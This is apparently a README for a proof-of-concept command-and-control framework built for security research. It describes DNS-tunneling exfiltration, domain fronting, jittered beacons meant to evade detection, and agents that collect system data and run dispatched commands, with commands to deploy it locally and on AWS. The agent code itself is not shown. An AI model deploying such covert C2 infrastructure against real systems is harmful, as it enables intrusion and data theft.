# Covert C2 Framework PoC

A lightweight Command and Control framework proof-of-concept for cybersecurity research and portfolio demonstration. Implements covert channel communications using DNS tunneling and domain fronting with AES-256-GCM encrypted payload transport.

## Architecture

```
  +------------------+        +------------------+        +------------------+
  |     Operator     |        |    C2 Server     |        |   DNS Server     |
  |  (CLI / API)     |<------>|  (Flask / Python)|<------>|  (BIND9 Tunnel)  |
  +------------------+  443   +------------------+  53    +------------------+
                               ^         |
                               | HTTPS   | DNS TXT / A
                               |         v
                    +------------------+        +------------------+
                    | Python Agent     |        |   C Agent        |
                    | (c2_agent.py)    |        |   (agent.c)      |
                    +------------------+        +------------------+
```

## Features

- **C2 Server**: Flask-based with REST API for agent management and command dispatch
- **DNS Tunneling**: Base32-encoded subdomain data exfiltration over standard DNS queries
- **Domain Fronting**: HTTPS requests routed through CDN with mismatched SNI/Host headers
- **AES-256-GCM Encryption**: All C2 communications encrypted using authenticated encryption
- **Jittered Beacons**: Configurable beacon interval with random jitter to evade pattern analysis
- **Dual Agents**: Python agent for rapid prototyping, C agent for minimal footprint
- **Telemetry Collection**: System info, process lists, network connections harvesting
- **Lab Environment**: Docker Compose with BIND9 for local DNS tunnel testing
- **Cloud Deployment**: Terraform templates for AWS VPC, EC2, Route53, and ACM

## Supported Channels

| Channel        | Protocol | Port | Use Case              |
|---------------|----------|------|-----------------------|
| HTTPS Direct  | TLS      | 443  | Primary C2 comms      |
| DNS Tunnel    | UDP      | 53   | Covert data exfil     |
| Domain Front  | HTTPS    | 443  | CDN-evasive C2 comms  |

## Setup

### Prerequisites

```bash
sudo apt-get update
sudo apt-get install -y gcc libcurl4-openssl-dev libssl-dev bind9-utils
```

### Python Environment

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

### Compile C Agent

```bash
cd src/modules/agent_handler
make clean && make
```

### Run C2 Server

```bash
python src/core/c2_server.py --host 0.0.0.0 --port 8080 --secret-key mysecretkey1234567890
```

### Run Python Agent

```bash
python src/core/c2_agent.py --server-url http://localhost:8080 --secret-key mysecretkey1234567890
```

### DNS Tunnel Demo

Terminal 1 - DNS Tunnel Server:
```bash
python src/core/dns_tunnel.py --mode server --domain c2.example.com --port 10053
```

Terminal 2 - DNS Tunnel Client:
```bash
python src/core/dns_tunnel.py --mode client --domain c2.example.com --dns-server 127.0.0.1 --port 10053
```

## Lab Environment

```bash
cd lab
docker compose up -d
```

This starts:
- **c2-server**: Python Flask C2 server on port 8080
- **dns-server**: BIND9 DNS server on port 53 (UDP) for tunnel testing
- **agent-container**: Built from C agent Dockerfile

## Cloud Deployment

```bash
cd lab/terraform
terraform init
terraform plan -var="aws_region=us-east-1"
terraform apply -var="aws_region=us-east-1" -auto-approve
```

## Running Tests

```bash
python -m pytest tests/ -v --tb=short
```

## Packet Capture

Capture DNS tunnel traffic:
```bash
sudo tcpdump -i lo -n port 53 -w dns_tunnel.pcap
```

Capture HTTPS C2 traffic:
```bash
sudo tcpdump -i any -n port 8080 -A -s 0 -w c2_traffic.pcap
```

## Usage Demo

1. Start the C2 server
2. Launch an agent (Python or C binary)
3. Agent registers via encrypted beacon
4. Dispatch commands through the server API
5. Agent polls for commands, executes, returns results
6. All payloads encrypted with AES-256-GCM

## Legal Disclaimer

This project is exclusively for authorized cybersecurity research, education, and portfolio demonstration. Unauthorized use of C2 frameworks against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse.
